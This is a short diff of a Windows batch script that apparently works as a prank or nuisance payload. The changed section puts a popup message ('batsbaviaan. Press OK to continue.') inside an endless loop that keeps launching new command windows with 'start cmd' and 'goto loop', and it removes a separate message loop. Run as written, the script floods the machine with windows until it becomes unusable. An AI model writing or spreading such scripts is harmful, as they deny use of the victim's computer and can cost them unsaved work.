@@ -40,11 +40,6 @@ RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 
 :: Start an infinite loop opening new command windows
 :loop
+msg * "batsbaviaan. Press OK to continue." 
 start cmd
 goto loop
-
-:: Display message in an infinite loop
-:msgloop
-msg * "batsbaviaan. Press OK to continue." 
-timeout /t 5 /nobreak >nul
-goto msgloop
